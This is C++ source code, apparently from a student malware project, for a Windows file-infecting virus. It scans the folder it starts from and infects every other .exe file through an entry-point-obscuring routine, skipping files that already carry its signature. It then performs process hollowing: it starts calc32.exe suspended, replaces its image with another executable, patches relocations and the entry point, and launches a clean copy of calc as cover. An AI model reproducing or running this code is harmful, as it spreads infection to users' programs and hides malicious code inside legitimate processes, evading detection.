
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <filesystem>
#include "EPO.h"

namespace fs = std::filesystem;

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);
using NT230_20521463_20520189 = NTSTATUS(WINAPI*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

bool isInfected(LPWSTR path);
void scanAndInfect(const std::string& path, const fs::path& avoid);

int main(int argc, char* argv[]) {
	std::cout << "startup path " << fs::path(argv[0]) << std::endl;
	scanAndInfect(fs::path(argv[0]).parent_path().string(), fs::path(argv[0]));
	// start calc.exe
	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
	DWORD returnLength = 0;
	CreateProcessA(NULL, (LPSTR)"C:\\Users\\k\\Desktop\\calc32.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
	HANDLE destProcess = pi->hProcess;

	// read ImageBaseAddress, in this case is 8 bytes away from PEB

	NT230_20521463_20520189 myNtQueryInfomationProcess = (NT230_20521463_20520189)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess"));
	(myNtQueryInfomationProcess)(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8;

	// get ImageBaseAddress
	LPVOID destImageBase = 0;
	SIZE_T bytesRead = NULL;
	ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead);

	// Read file
	HANDLE sourceFile = CreateFileA("C:\\Users\\k\\Desktop\\WindowsProject132.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
	LPDWORD fileBytesRead = 0;
	LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
	ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, fileBytesRead, NULL);

	// get source image size
	PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
	PIMAGE_NT_HEADERS sourceImageNTHeader = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
	SIZE_T sourceImageSize = sourceImageNTHeader->OptionalHeader.SizeOfImage;

	NtUnmapViewOfSection myNtUmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
	(myNtUmapViewOfSection)(destProcess, destImageBase);

	LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	destImageBase = newDestImageBase;

	DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeader->OptionalHeader.ImageBase;

	sourceImageNTHeader->OptionalHeader.ImageBase = (DWORD)destImageBase;
	WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeader->OptionalHeader.SizeOfHeaders, NULL);

	PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
	PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;

	for (int i = 0; i < sourceImageNTHeader->FileHeader.NumberOfSections; ++i) {
		PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);
		PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
		WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
		sourceImageSection++;
	}

	IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	sourceImageSection = sourceImageSectionOld;
	for (int i = 0; i < sourceImageNTHeader->FileHeader.NumberOfSections; i++) {
		BYTE* relocSectionName = (BYTE*)".reloc";
		if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0) {
			sourceImageSection++;
			continue;
		}

		DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
		DWORD relocationOffset = 0;

		while (relocationOffset < relocationTable.Size) {
			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
			relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
			DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);

			for (DWORD y = 0; y < relocationEntryCount; y++) {
				relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocationEntries[y].Type == 0) {
					continue;
				}

				DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
				DWORD patchedBuffer = 0;

				ReadProcessMemory(destProcess, (LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
				patchedBuffer += deltaImageBase;

				WriteProcessMemory(destProcess, (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead);
				int a = GetLastError();
			}
		}
	}

	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pi->hThread, context);

	DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeader->OptionalHeader.AddressOfEntryPoint;
	context->Eax = patchedEntryPoint;
	SetThreadContext(pi->hThread, context);
	ResumeThread(pi->hThread);


	// create new thread that run original file :v
	LPSTARTUPINFOA ssi = new STARTUPINFOA();
	LPPROCESS_INFORMATION ppi = new PROCESS_INFORMATION();
	CreateProcessA(NULL, (LPSTR)"C:\\Users\\k\\Desktop\\calc32.exe", NULL, NULL, FALSE, 0, NULL, NULL, ssi, ppi);

	return 0;
}

void scanAndInfect(const std::string& path, const fs::path& avoid) {
	for (const auto& entry : fs::directory_iterator(path)) {
		if (entry.is_regular_file()) {
			if (entry.path().extension().compare(L".exe") == 0) {
				if (entry.path().compare(avoid) == 0)
					continue;

				std::cout << entry.path() << std::endl;
				if (isInfected(&entry.path().wstring()[0])) {
					std::cout << entry.path() << " is already infected!" << std::endl;
					continue;
				}

				std::cout << "Infecting " << entry.path() << std::endl;
				EPO(&entry.path().wstring()[0], &entry.path().wstring()[0]);
				std::cout << entry.path() << " is infected!" << std::endl;
			}
		}
	}
}

bool isInfected(LPWSTR path) {
	HANDLE file = CreateFileW(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD fileSize = GetFileSize(file, NULL);
	LPVOID fileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
	ReadFile(file, fileBytesBuffer, fileSize, NULL, NULL);
	CloseHandle(file);

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fileBytesBuffer;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((DWORD)fileBytesBuffer + dos->e_lfanew);
	PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((DWORD)fileBytesBuffer + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS32));


	DWORD beginOfEP = (DWORD)fileBytesBuffer + nt->OptionalHeader.AddressOfEntryPoint + sec->PointerToRawData - sec->VirtualAddress;

	// check first 7 byte with signature which is \xb8 <4 bytes> \xff \xd0

	BYTE signature[3] = { 0 };

	signature[0] = *(BYTE*)beginOfEP;
	signature[1] = *(BYTE*)(beginOfEP + 5);
	signature[2] = *(BYTE*)(beginOfEP + 6);

	bool flag = false;
	if (signature[0] == 0xb8 && signature[1] == 0xff && signature[2] == 0xd0)
		flag = true;

	HeapFree(GetProcessHeap(), NULL, fileBytesBuffer);

	return flag;
}